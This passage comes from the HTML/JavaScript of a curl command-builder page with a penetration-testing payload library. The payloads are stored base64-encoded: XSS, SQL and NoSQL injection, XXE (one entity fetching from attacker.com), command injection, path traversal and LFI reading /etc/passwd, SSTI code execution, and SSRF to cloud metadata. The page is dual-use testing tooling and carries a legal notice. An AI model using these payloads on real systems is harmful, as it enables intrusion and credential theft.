                                    <div class="checkbox-description">Skip SSL verification for proxy connections.</div>
                                </div>
                            </label>
                        </div>
                    </div>
                </div>

                <!-- File Upload & Cookies -->
                <div class="collapsible">
                    <div class="collapsible-header">
                        <div class="collapsible-title">
                            <i class="fas fa-file-upload"></i>
                            File Upload & Cookie Management
                        </div>
                        <i class="fas fa-chevron-down collapsible-icon"></i>
                    </div>
                    <div class="collapsible-content">
                        <div class="help-tip">
                            <i class="fas fa-upload icon"></i>
                            <div>Upload files using multipart/form-data encoding or manage cookies for session-based authentication and state management.</div>
                        </div>

                        <div class="form-group">
                            <label class="form-label">File Upload</label>
                            <span class="form-description">Upload files using multipart form data. Use @ prefix for file paths.</span>
                            <div class="input-row">
                                <input type="text" id="upload-field" class="form-input" placeholder="Field name (e.g., file, avatar)">
                                <input type="text" id="upload-file" class="form-input" placeholder="@/path/to/file.jpg">
                            </div>
                        </div>

                        <div class="form-group">
                            <label class="form-label">Form Data Fields</label>
                            <span class="form-description">Additional form fields to send with file upload.</span>
                            <textarea id="form-data" class="form-textarea" placeholder="field1=value1&#10;field2=value2" style="min-height: 80px;"></textarea>
                        </div>

                        <div class="form-group">
                            <label class="form-label">Cookies</label>
                            <span class="form-description">Send cookies with your request. Format: name1=value1; name2=value2</span>
                            <textarea id="cookies" class="form-textarea" placeholder="sessionid=abc123; csrf_token=xyz789" style="min-height: 80px;"></textarea>
                        </div>

                        <div class="options-grid">
                            <div class="form-group">
                                <label class="form-label">Cookie Jar (Save Cookies)</label>
                                <span class="form-description">File to save received cookies for future requests.</span>
                                <input type="text" id="cookie-jar" class="form-input" placeholder="/path/to/cookies.txt">
                            </div>

                            <div class="form-group">
                                <label class="form-label">Load Cookies From</label>
                                <span class="form-description">File to load existing cookies from.</span>
                                <input type="text" id="cookie-file" class="form-input" placeholder="/path/to/saved-cookies.txt">
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Output & Debugging Options -->
                <div class="collapsible">
                    <div class="collapsible-header">
                        <div class="collapsible-title">
                            <i class="fas fa-terminal"></i>
                            Output & Debugging Options
                        </div>
                        <i class="fas fa-chevron-down collapsible-icon"></i>
                    </div>
                    <div class="collapsible-content">
                        <div class="checkbox-group">
                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-verbose" checked>
                                <div class="checkbox-content">
                                    <div class="checkbox-label">Verbose Output (-v)</div>
                                    <div class="checkbox-description">Show detailed information about the request and response, including headers and SSL handshake.</div>
                                </div>
                            </label>

                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-silent">
                                <div class="checkbox-content">
                                    <div class="checkbox-label">Silent Mode (-s)</div>
                                    <div class="checkbox-description">Run in silent mode, suppressing progress and error information.</div>
                                </div>
                            </label>

                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-show-error">
                                <div class="checkbox-content">
                                    <div class="checkbox-label">Show Errors (-S)</div>
                                    <div class="checkbox-description">Show errors even in silent mode.</div>
                                </div>
                            </label>

                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-location" checked>
                                <div class="checkbox-content">
                                    <div class="checkbox-label">Follow Redirects (-L)</div>
                                    <div class="checkbox-description">Automatically follow HTTP redirects (301, 302, etc.).</div>
                                </div>
                            </label>

                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-compressed">
                                <div class="checkbox-content">
                                    <div class="checkbox-label">Request Compression (--compressed)</div>
                                    <div class="checkbox-description">Request compressed response and automatically decompress.</div>
                                </div>
                            </label>

                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-include">
                                <div class="checkbox-content">
                                    <div class="checkbox-label">Include Headers (-i)</div>
                                    <div class="checkbox-description">Include response headers in the output.</div>
                                </div>
                            </label>

                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-head">
                                <div class="checkbox-content">
                                    <div class="checkbox-label">HEAD Request Only (-I)</div>
                                    <div class="checkbox-description">Send HEAD request to get headers without body.</div>
                                </div>
                            </label>

                            <label class="checkbox-item">
                                <input type="checkbox" id="opt-fail">
                                <div class="checkbox-content">
                                    <div class="checkbox-label">Fail on HTTP Errors (--fail)</div>
                                    <div class="checkbox-description">Return error exit code on HTTP error responses (4xx, 5xx).</div>
                                </div>
                            </label>
                        </div>

                        <div class="options-grid" style="margin-top: 1.5rem;">
                            <div class="form-group">
                                <label class="form-label">Output File</label>
                                <span class="form-description">Save response body to file instead of stdout.</span>
                                <input type="text" id="output-file" class="form-input" placeholder="/path/to/output.txt">
                            </div>

                            <div class="form-group">
                                <label class="form-label">Headers Output File</label>
                                <span class="form-description">Save response headers to separate file.</span>
                                <input type="text" id="dump-header" class="form-input" placeholder="/path/to/headers.txt">
                            </div>
                        </div>

                        <div class="options-grid">
                            <div class="form-group">
                                <label class="form-label">Write-Out Format</label>
                                <span class="form-description">Custom format for displaying request statistics.</span>
                                <input type="text" id="write-out" class="form-input" placeholder='Response: %{response_code} | Time: %{time_total}s'>
                            </div>

                            <div class="form-group">
                                <label class="form-label">Progress Bar Style</label>
                                <span class="form-description">Choose progress indicator style.</span>
                                <select id="progress-bar" class="form-select">
                                    <option value="">Default</option>
                                    <option value="--progress-bar">Simple Bar</option>
                                    <option value="--no-progress-meter">No Progress</option>
                                </select>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Generated Command Output -->
                <div class="card">
                    <div class="card-header">
                        <div class="card-title">
                            <i class="fas fa-code icon"></i>
                            Generated CURL Command
                        </div>
                        <div style="display: flex; gap: 0.5rem;">
                            <button id="copy-btn" class="btn btn-success btn-sm">
                                <i class="fas fa-copy"></i> Copy Command
                            </button>
                            <button id="download-btn" class="btn btn-secondary btn-sm">
                                <i class="fas fa-download"></i> Download .sh
                            </button>
                            <button id="share-btn" class="btn btn-info btn-sm">
                                <i class="fas fa-share-alt"></i> Share
                            </button>
                        </div>
                    </div>
                    <div class="card-body">
                        <div class="help-tip">
                            <i class="fas fa-terminal icon"></i>
                            <div>Copy this command and run it in your terminal. Make sure you have curl installed and proper permissions for any file operations.</div>
                        </div>
                        <textarea id="output" class="output-textarea scrollbar-custom" readonly placeholder="Your generated CURL command will appear here... Configure your request above and click 'Generate Command'"></textarea>
                    </div>
                </div>
            </div>

            <!-- Right Panel - Payload Library & Tools -->
            <div>
                <!-- WAF Testing Payload Library -->
                <div class="card">
                    <div class="card-header">
                        <div class="card-title">
                            <i class="fas fa-database icon"></i>
                            Security Testing Payloads
                            <span id="payload-count" class="badge badge-primary">0</span>
                        </div>
                        <button id="add-custom-payload-btn" class="btn btn-success btn-sm">
                            <i class="fas fa-plus"></i> Custom
                        </button>
                    </div>
                    <div class="card-body">
                        <div class="help-tip">
                            <i class="fas fa-bug icon"></i>
                            <div>Comprehensive collection of security testing payloads for penetration testing and vulnerability assessment. Always ensure you have proper authorization before testing.</div>
                        </div>

                        <div class="payload-search">
                            <i class="fas fa-search payload-search-icon"></i>
                            <input type="text" id="payload-search" class="payload-search-input" placeholder="Search payloads by type or content...">
                        </div>
                        
                        <div class="payload-categories">
                            <button class="payload-cat-btn active" data-category="all" title="Show all payload categories">All</button>
                            <button class="payload-cat-btn" data-category="xss" title="Cross-Site Scripting payloads">XSS</button>
                            <button class="payload-cat-btn" data-category="sqli" title="SQL Injection payloads">SQL Injection</button>
                            <button class="payload-cat-btn" data-category="xxe" title="XML External Entity payloads">XXE</button>
                            <button class="payload-cat-btn" data-category="cmd" title="Command Injection payloads">Command</button>
                            <button class="payload-cat-btn" data-category="path" title="Path Traversal payloads">Path Traversal</button>
                            <button class="payload-cat-btn" data-category="ssti" title="Server-Side Template Injection">SSTI</button>
                            <button class="payload-cat-btn" data-category="ssrf" title="Server-Side Request Forgery">SSRF</button>
                            <button class="payload-cat-btn" data-category="nosql" title="NoSQL Injection payloads">NoSQL</button>
                            <button class="payload-cat-btn" data-category="lfi" title="Local File Inclusion">LFI</button>
                        </div>

                        <div id="payload-list" class="payload-list scrollbar-custom">
                            <!-- Payloads will be populated here -->
                        </div>
                    </div>
                </div>

                <!-- Quick Templates -->
                <div class="card">
                    <div class="card-header">
                        <div class="card-title">
                            <i class="fas fa-layer-group icon"></i>
                            Quick Templates
                        </div>
                    </div>
                    <div class="card-body">
                        <div class="template-grid">
                            <div class="template-card" data-template="api-test">
                                <div class="template-icon">
                                    <i class="fas fa-cloud"></i>
                                </div>
                                <div class="template-title">API Testing</div>
                                <div class="template-description">REST API endpoint testing with JSON</div>
                            </div>
                            
                            <div class="template-card" data-template="form-test">
                                <div class="template-icon">
                                    <i class="fas fa-wpforms"></i>
                                </div>
                                <div class="template-title">Form Testing</div>
                                <div class="template-description">HTML form submission testing</div>
                            </div>
                            
                            <div class="template-card" data-template="auth-test">
                                <div class="template-icon">
                                    <i class="fas fa-key"></i>
                                </div>
                                <div class="template-title">Auth Testing</div>
                                <div class="template-description">Authentication bypass testing</div>
                            </div>
                            
                            <div class="template-card" data-template="upload-test">
                                <div class="template-icon">
                                    <i class="fas fa-upload"></i>
                                </div>
                                <div class="template-title">File Upload</div>
                                <div class="template-description">File upload vulnerability testing</div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Security Testing Guide -->
                <div class="card">
                    <div class="card-header">
                        <div class="card-title">
                            <i class="fas fa-shield-alt icon"></i>
                            Security Testing Guide
                        </div>
                    </div>
                    <div class="card-body">
                        <div style="font-size: 0.875rem; color: var(--gray-600); line-height: 1.6;">
                            <div style="margin-bottom: 1rem;">
                                <strong style="color: var(--gray-800);">Testing Methodology:</strong><br>
                                1. Start with basic requests<br>
                                2. Test authentication mechanisms<br>
                                3. Analyze input validation<br>
                                4. Check for injection vulnerabilities<br>
                                5. Test file upload functionality<br>
                                6. Verify access controls
                            </div>
                            
                            <div style="margin-bottom: 1rem;">
                                <strong style="color: var(--gray-800);">Common CURL Options:</strong><br>
                                 Use <code>-v</code> for detailed output<br>
                                 Add <code>-k</code> for self-signed certs<br>
                                 Use <code>-L</code> to follow redirects<br>
                                 Add <code>-H</code> for custom headers<br>
                                 Use <code>-d</code> for POST data<br>
                                 Add <code>-F</code> for file uploads
                            </div>
                            
                            <div style="background: var(--danger); color: white; padding: 0.75rem; border-radius: 6px; font-size: 0.75rem;">
                                <strong> Legal Notice:</strong> Only test applications you own or have explicit permission to test. Unauthorized testing is illegal and unethical.
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Command History -->
                <div class="card">
                    <div class="card-header">
                        <div class="card-title">
                            <i class="fas fa-history icon"></i>
                            Command History
                            <span id="saved-count" class="badge badge-success">0</span>
                        </div>
                        <button id="clear-saved-btn" class="btn btn-danger btn-sm">
                            <i class="fas fa-trash"></i> Clear All
                        </button>
                    </div>
                    <div class="card-body">
                        <div id="saved-commands" class="scrollbar-custom" style="max-height: 300px; overflow-y: auto;">
                            <div style="padding: 1.5rem; text-align: center; color: var(--gray-500);">
                                <i class="fas fa-bookmark" style="font-size: 2rem; margin-bottom: 0.5rem; opacity: 0.3;"></i><br>
                                No saved commands yet<br>
                                <small>Use the Save button to store your commands</small>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Templates Modal -->
    <div id="templates-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Quick Templates</h2>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <div class="help-tip">
                    <i class="fas fa-magic icon"></i>
                    <div>Choose a template to quickly configure your request for common testing scenarios.</div>
                </div>
                <!-- Template content will be populated here -->
            </div>
        </div>
    </div>

    <!-- Help Modal -->
    <div id="help-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">CURL Commander Pro - Help & Guide</h2>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <!-- Help content will be populated here -->
            </div>
        </div>
    </div>

    <!-- Toast Notification -->
    <div id="toast" class="toast">
        <i class="fas fa-check-circle"></i>
        <span id="toast-message">Success!</span>
    </div>

    <script>
    // Enhanced payload database with base64 encoding for security
    const payloadDatabase = {
        xss: [
            "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+",
            "PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdYU1MnKT4=",
            "PHN2Zy9vbmxvYWQ9YWxlcnQoJ1hTUycpPg==",
            "PGJvZHkgb25sb2FkPWFsZXJ0KCdYU1MnKT4=",
            "PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgnWFNTJyk+PC9pZnJhbWU+",
            "PGlucHV0IGF1dG9mb2N1cyBvbmZvY3VzPWFsZXJ0KCdYU1MnKT4=",
            "PHNjcmlwdD5jb25maXJtKCdYU1MnKTwvc2NyaXB0Pg==",
            "PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJykiPkNsaWNrPC9hPg==",
            "PGRpdiBvbm1vdXNlb3Zlcj0iYWxlcnQoJ1hTUycpIj5Ib3ZlcjwvZGl2Pg=="
        ],
        sqli: [
            "JyBPUiAnMSc9JzE=",
            "JyBPUiAnMSc9JzEtLQ==",
            "JyBPUiAnMSc9JzEvKg==",
            "IiBPUiAiMSI9IjE=",
            "T1IgMT0x",
            "T1IgMT0xLS0=",
            "T1IgMT0xIw==",
            "JyBVTklPTiBTRUxFQ1QgMS0t",
            "JyBVTklPTiBTRUxFQ1QgMSwyLS0=",
            "JyBVTklPTiBTRUxFQ1QgMSwyLDMtLQ==",
            "JyBVTklPTiBTRUxFQ1QgdXNlcm5hbWUsIHBhc3N3b3JkIEZST00gdXNlcnMtLQ==",
            "JyBVTklPTiBTRUxFQ1QgdmVyc2lvbigpLS0=",
            "JyBBTkQgKFNFTEVDVCBTVUJTVFJJTkcodXNlcigpLDEsMSkgPSAnYScpLS0=",
            "JyBBTkQgKFNFTEVDVCBTTEVFUCg1KSktLQ==",
            "JyBXQUlURk9SIERFTEFZICcwOjA6NSctLQ=="
        ],
        xxe: [
            "PD94bWwgdmVyc2lvbj0iMS4wIj8+PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj5dPjxmb28+Jnh4ZTs8L2Zvbz4=",
            "PD94bWwgdmVyc2lvbj0iMS4wIj8+PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9jOi93aW5kb3dzL3dpbi5pbmkiPl0+PGZvbz4meHhlOzwvZm9vPg==",
            "PD94bWwgdmVyc2lvbj0iMS4wIj8+PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlIFNZU1RFTSAiaHR0cDovL2F0dGFja2VyLmNvbS9ldmlsLnR4dCI+XT48Zm9vPiZ4eGU7PC9mb28+",
            "PD94bWwgdmVyc2lvbj0iMS4wIj8+PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlIFNZU1RFTSAicGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS9ldGMvcGFzc3dkIj5dPjxmb28+Jnh4ZTs8L2Zvbz4=",
            "PGZvbyB4bWxuczp4aT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS9YSW5jbHVkZSI+PHhpOmluY2x1ZGUgcGFyc2U9InRleHQiIGhyZWY9ImZpbGU6Ly8vZXRjL3Bhc3N3ZCIvPjwvZm9vPg=="
        ],
        cmd: [
            "OyBscyAtbGE=",
            "fCBscyAtbGE=",
            "JiYgbHMgLWxh",
            "OyBjYXQgL2V0Yy9wYXNzd2Q=",
            "fCBjYXQgL2V0Yy9wYXNzd2Q=",
            "JiYgY2F0IC9ldGMvcGFzc3dk",
            "YCBscyAtbGFg",
            "JChscyAtbGEp",
            "YCBjYXQgL2V0Yy9wYXNzd2Rg",
            "JChjYXQgL2V0Yy9wYXNzd2Qp",
            "OyB3aG9hbWk=",
            "OyBpZA==",
            "OyBwcw==",
            "OyBuZXRzdGF0IC1hbg==",
            "OyBwaW5nIC1jIDEgMTI3LjAuMC4x"
        ],
        path: [
            "Li4vLi4vLi4vZXRjL3Bhc3N3ZA==",
            "Li5cLi5cLi5cd2luZG93c1x3aW4uaW5p",
            "Li4vLi4vLi4vZXRjL3NoYWRvdw==",
            "Li4vLi4vLi4vZXRjL2hvc3Rz",
            "Li4vLi4vLi4vdmFyL2xvZy9hcGFjaGUyL2FjY2Vzcy5sb2c=",
            "ZmlsZTovLy9ldGMvcGFzc3dk",
            "cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vZXRjL3Bhc3N3ZA==",
            "Li4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==",
            "JTJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmZXRjJTJmcGFzc3dk",
            "Li4vLi4vLi4vZXRjL3Bhc3N3ZC8u"
        ],
        ssti: [
            "e3s3Kjd9fQ==",
            "e3s3KicnN319",
            "JHs3Kjd9",
            "I3s3Kjd9",
            "Kns3Kjd9",
            "e3snJ19fY2xhc3NfXycuX19tcm9fX1sxXS5fX3N1YmNsYXNzZXNfXygpfX0=",
            "JHtUKGphdmEubGFuZy5SdW50aW1lKS5nZXRSdW50aW1lKCkuZXhlYygnaWQnKX0=",
            "I3tUKGphdmEubGFuZy5TeXN0ZW0pLmdldGVudigpfQ==",
            "e3sgc2VsZi5fX2NsYXNzX18uX19tcm9fX1sxXS5fX3N1YmNsYXNzZXNfXygpIH19",
            "JCh7J2NhdCcuJ2V4ZWMnKCcvZXRjL3Bhc3N3ZCcpfSk="
        ],
        ssrf: [
            "aHR0cDovLzEyNy4wLjAuMS8=",
            "aHR0cDovL2xvY2FsaG9zdC8=",
            "aHR0cDovL1s6OjFdLw==",
            "aHR0cDovLzAuMC4wLjAv",
            "aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw==",
            "Z29waGVyOi8vMTI3LjAuMC4xOjI1Lw==",
            "ZmlsZTovLy9ldGMvcGFzc3dk",
            "aHR0cDovL2xvY2FsaG9zdC5sb2NhbGRvbWFpbi8=",
            "aHR0cDovLzEyNy4wLjAuMTpleGFtcGxlLmNvbS8=",
            "aHR0cDovL2F0dGFja2VyLWNvbnRyb2xsZWQtZG9tYWluLmNvbS8="
        ],
        nosql: [
            "eyIkZ3QiOiAiIn0=",
            "eyIkbmUiOiBudWxsfQ==",
            "eyIkbmluIjogWyJhZG1pbiIsICJhZG1pbmlzdHJhdG9yIl19",
            "eyIkbm90IjogeyIkZXEiOiAiYWRtaW4ifX0=",
            "eyIkZXhpc3RzIjogdHJ1ZX0=",
            "eyJ1c2VybmFtZSI6IHsiJHJlZ2V4IjogIl5hZG0ifX0=",
            "eyJ1c2VybmFtZSI6IHsiJHJlZ2V4IjogIl5hZG1pbiIsICIkb3B0aW9ucyI6ICJpIn19",
            "eyJ1c2VybmFtZSI6IHsiJGd0IjogIiJ9fQ==",
            "eyJ1c2VybmFtZSI6IHsiJG5lIjogImFkbWluIn19",
            "eyJ1c2VybmFtZSI6IHsiJGluIjogWyJhZG1pbiIsICJhZG1pbmlzdHJhdG9yIiwgInJvb3QiXX19"
        ],
        lfi: [
            "ZmlsZT0uLi8uLi8uLi9ldGMvcGFzc3dk",
            "cGFnZT0uLi8uLi8uLi9ldGMvcGFzc3dk",
            "cGF0aD0uLi8uLi8uLi9ldGMvcGFzc3dk",
            "ZmlsZT0uLi8uLi8uLi9ldGMvcGFzc3dkJTAw",
            "ZmlsZT1waHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2luZGV4LnBocA==",
            "ZmlsZT1maWxlOi8vL2V0Yy9wYXNzd2Q=",
            "ZmlsZT0uLi8uLi8uLi93aW5kb3dzL3dpbi5pbmk=",
            "ZmlsZT0uLi8uLi8uLi92YXIvbG9nL2FwYWNoZTIvYWNjZXNzLmxvZw==",
            "ZmlsZT1waHA6Ly9pbnB1dA==",
            "ZmlsZT1kYXRhOi8vdGV4dC9wbGFpbjtiYXNlNjQsUEQ5d2FIQWdjM2x6ZEdWdEtDUmZSMFZVV3ljblkyMWtKMTBwT3pkaFltOWJJZzA9"
        ]
    };

    // Application state
    let currentMethod = 'GET';
    let currentCategory = 'all';
    let savedCommands = JSON.parse(localStorage.getItem('curlCommands') || '[]');

    // Utility functions
    function decodePayload(encodedPayload) {
        try {
            return atob(encodedPayload);
        } catch (e) {
            console.error('Failed to decode payload:', e);
            return encodedPayload;
        }
    }

    function safeShellEscape(str) {
        return "'" + String(str).replace(/'/g, "'\"'\"'") + "'";
    }

    // Initialize application
    document.addEventListener('DOMContentLoaded', () => {
        initializeApp();
    });

    function initializeApp() {
        setupEventListeners();
        setupCollapsibles();
        displayPayloads('all');
        updateSavedCommands();
        generateCurl();
        loadTemplates();
    }

    function setupEventListeners() {
        // Method buttons
        document.querySelectorAll('.method-btn').forEach(button => {
            button.addEventListener('click', () => {
                document.querySelectorAll('.method-btn').forEach(btn => btn.classList.remove('active'));
                button.classList.add('active');
                currentMethod = button.getAttribute('data-method');
                generateCurl();
            });
        });

        // Category buttons
        document.querySelectorAll('.payload-cat-btn').forEach(button => {
            button.addEventListener('click', () => {
                document.querySelectorAll('.payload-cat-btn').forEach(btn => btn.classList.remove('active'));
                button.classList.add('active');
                currentCategory = button.getAttribute('data-category');
                displayPayloads(currentCategory);
            });
        });

        // Input listeners - expanded list
        const inputIds = [
            'url', 'body', 'timeout', 'max-redirects', 'retry', 'connect-timeout', 'rate-limit',
            'cacert', 'cert', 'key', 'proxy', 'socks-proxy', 'proxy-user', 'interface',
            'upload-field', 'upload-file', 'form-data', 'cookies', 'cookie-jar', 'cookie-file',
            'output-file', 'dump-header', 'write-out', 'custom-user-agent'
        ];
        
        inputIds.forEach(id => {
            const element = document.getElementById(id);
            if (element) {
                element.addEventListener('input', generateCurl);
            }
        });

        // Select listeners
        ['auth-type', 'user-agent', 'tls-version', 'progress-bar'].forEach(id => {
            const element = document.getElementById(id);
            if (element) {
                element.addEventListener('change', () => {
                    if (id === 'auth-type') updateAuthFields();
                    if (id === 'user-agent') updateUserAgentField();
                    generateCurl();
                });
            }
        });

        // Checkbox listeners
        document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
            checkbox.addEventListener('change', generateCurl);
        });

        // Button listeners
        document.getElementById('add-header-btn').addEventListener('click', addHeader);
        document.getElementById('generate-btn').addEventListener('click', generateCurl);
        document.getElementById('copy-btn').addEventListener('click', copyCommand);
        document.getElementById('download-btn').addEventListener('click', downloadCommand);
        document.getElementById('share-btn').addEventListener('click', shareCommand);
        document.getElementById('save-command-btn').addEventListener('click', saveCommand);
        document.getElementById('clear-saved-btn').addEventListener('click', clearSavedCommands);
        document.getElementById('reset-all-btn').addEventListener('click', resetAll);
        document.getElementById('format-json-btn').addEventListener('click', formatJSON);
        document.getElementById('encode-body-btn').addEventListener('click', encodeBody);
        document.getElementById('decode-body-btn').addEventListener('click', decodeBody);
        document.getElementById('base64-encode-btn').addEventListener('click', base64EncodeBody);
        document.getElementById('templates-btn').addEventListener('click', () => showModal('templates-modal'));
        document.getElementById('help-btn').addEventListener('click', () => showModal('help-modal'));

        // Preset buttons
        document.querySelectorAll('.preset-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                const preset = btn.getAttribute('data-preset');
                applyHeaderPreset(preset);
            });
        });

        // Template cards
        document.querySelectorAll('.template-card').forEach(card => {
            card.addEventListener('click', () => {
                const template = card.getAttribute('data-template');
                applyTemplate(template);
            });
        });

        // Search input
        document.getElementById('payload-search').addEventListener('input', e => {
            searchPayloads(e.target.value);
        });

        // Modal close handlers
        document.querySelectorAll('.modal-close').forEach(btn => {
            btn.addEventListener('click', () => hideModal(btn.closest('.modal').id));
        });

        // Click outside modal to close
        document.addEventListener('click', e => {
            if (e.target.classList.contains('modal')) {
                hideModal(e.target.id);
            }
        });

        // Remove header delegation
        document.addEventListener('click', e => {
            if (e.target.closest('.remove-header')) {
                e.target.closest('.header-row').remove();
                generateCurl();
            }
        });
    }

    function setupCollapsibles() {
        document.querySelectorAll('.collapsible-header').forEach(header => {
            header.addEventListener('click', () => {
                const collapsible = header.closest('.collapsible');
                collapsible.classList.toggle('active');
            });
        });

        // Open first collapsible by default
        document.querySelector('.collapsible').classList.add('active');
    }

    function updateAuthFields() {
        const authType = document.getElementById('auth-type').value;
        const container = document.getElementById('auth-fields');
        container.innerHTML = '';

        switch (authType) {
            case 'basic':
                container.innerHTML = `
                    <div class="form-group">
                        <span class="form-description">Enter username and password for HTTP Basic Authentication.</span>
                        <div class="input-row">
                            <input type="text" id="auth-user" class="form-input" placeholder="Username">
                            <input type="password" id="auth-pass" class="form-input" placeholder="Password">
                        </div>
                    </div>
                `;
                break;
            case 'bearer':
                container.innerHTML = `
                    <div class="form-group">
                        <span class="form-description">Enter your Bearer token (JWT, OAuth token, etc.).</span>
                        <input type="text" id="auth-token" class="form-input" placeholder="Enter bearer token">
                    </div>
                `;
                break;
            case 'api-key':
                container.innerHTML = `
                    <div class="form-group">
                        <span class="form-description">Enter custom API key header name and value.</span>
                        <div class="input-row">
                            <input type="text" id="api-key-name" class="form-input" placeholder="Header name (e.g., X-API-Key)">
                            <input type="text" id="api-key-value" class="form-input" placeholder="API key value">
                        </div>
                    </div>
                `;
                break;
            case 'digest':
                container.innerHTML = `
                    <div class="form-group">
                        <span class="form-description">Enter username and password for HTTP Digest Authentication.</span>
                        <div class="input-row">
                            <input type="text" id="digest-user" class="form-input" placeholder="Username">
                            <input type="password" id="digest-pass" class="form-input" placeholder="Password">
                        </div>
                    </div>
                `;
                break;
            case 'oauth1':
                container.innerHTML = `
                    <div class="form-group">
                        <span class="form-description">OAuth 1.0 credentials for authentication.</span>
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem;">
                            <input type="text" id="oauth-key" class="form-input" placeholder="Consumer Key">
                            <input type="text" id="oauth-secret" class="form-input" placeholder="Consumer Secret">
                            <input type="text" id="oauth-token" class="form-input" placeholder="Access Token">
                            <input type="text" id="oauth-token-secret" class="form-input" placeholder="Token Secret">
                        </div>
                    </div>
                `;
                break;
            case 'ntlm':
                container.innerHTML = `
                    <div class="form-group">
                        <span class="form-description">Windows NTLM authentication credentials.</span>
                        <div class="input-row">
                            <input type="text" id="ntlm-user" class="form-input" placeholder="DOMAIN\\username">
                            <input type="password" id="ntlm-pass" class="form-input" placeholder="Password">
                        </div>
                    </div>
                `;
                break;
            case 'aws':
                container.innerHTML = `
                    <div class="form-group">
                        <span class="form-description">AWS Signature v4 authentication.</span>
                        <div style="display: grid; gap: 0.5rem;">
                            <input type="text" id="aws-access-key" class="form-input" placeholder="AWS Access Key">
                            <input type="text" id="aws-secret-key" class="form-input" placeholder="AWS Secret Key">
                            <input type="text" id="aws-region" class="form-input" placeholder="Region (e.g., us-east-1)">
                            <input type="text" id="aws-service" class="form-input" placeholder="Service (e.g., s3, ec2)">
                        </div>
                    </div>
                `;
                break;
        }

        // Add event listeners to new fields
        container.querySelectorAll('input').forEach(input => {
            input.addEventListener('input', generateCurl);
        });
    }

    function updateUserAgentField() {
        const userAgent = document.getElementById('user-agent').value;
        const customField = document.getElementById('custom-user-agent');
        
        if (userAgent === 'custom') {
            customField.style.display = 'block';
            customField.focus();
        } else {
            customField.style.display = 'none';
        }
    }

    function applyHeaderPreset(preset) {
        const container = document.getElementById('headers-container');
        
        // Clear existing headers except the first one
        const existingRows = container.querySelectorAll('.header-row');
        existingRows.forEach((row, index) => {
            if (index > 0) row.remove();
        });

        const presets = {
            json: [
                ['Content-Type', 'application/json'],
                ['Accept', 'application/json'],
                ['Cache-Control', 'no-cache']
            ],
            form: [
                ['Content-Type', 'application/x-www-form-urlencoded'],
                ['Accept', 'text/html,application/xhtml+xml'],
                ['Cache-Control', 'no-cache']
            ],
            xml: [
                ['Content-Type', 'application/xml'],
                ['Accept', 'application/xml'],
                ['SOAPAction', '""']
            ]
        };

        if (presets[preset]) {
            // Update first row
            const firstRow = container.querySelector('.header-row');
            const firstNameInput = firstRow.querySelector('.header-name');
            const firstValueInput = firstRow.querySelector('.header-value');
            
            firstNameInput.value = presets[preset][0][0];
            firstValueInput.value = presets[preset][0][1];

            // Add additional rows
            for (let i = 1; i < presets[preset].length; i++) {
                addHeader(presets[preset][i][0], presets[preset][i][1]);
            }

            generateCurl();
            showToast(`${preset.toUpperCase()} headers applied!`, 'success');
        }
    }

    function applyTemplate(template) {
        const templates = {
            'api-test': {
                method: 'POST',
                url: 'https://api.example.com/v1/users',
                headers: [['Content-Type', 'application/json'], ['Authorization', 'Bearer YOUR_TOKEN']],
                body: '{\n  "username": "testuser",\n  "email": "test@example.com"\n}'
            },
            'form-test': {
                method: 'POST',
                url: 'https://example.com/form/submit',
                headers: [['Content-Type', 'application/x-www-form-urlencoded']],
                body: 'username=admin&password=password&submit=login'
            },
            'auth-test': {
                method: 'GET',
                url: 'https://example.com/admin/dashboard',
                headers: [['Cookie', 'session=vulnerable_session_token'], ['User-Agent', 'Mozilla/5.0']],
                body: ''
            },
            'upload-test': {
                method: 'POST',
                url: 'https://example.com/upload',
                uploadField: 'file',
                uploadFile: '@/path/to/test.php',
                formData: 'description=test file'
            }
        };

        const config = templates[template];
        if (config) {
            // Set method
            document.querySelectorAll('.method-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelector(`[data-method="${config.method}"]`).classList.add('active');
            currentMethod = config.method;

            // Set URL
            document.getElementById('url').value = config.url;

            // Set headers
            if (config.headers) {
                const container = document.getElementById('headers-container');
                container.innerHTML = '';
                config.headers.forEach(([name, value]) => {
                    addHeader(name, value);
                });
            }

            // Set body
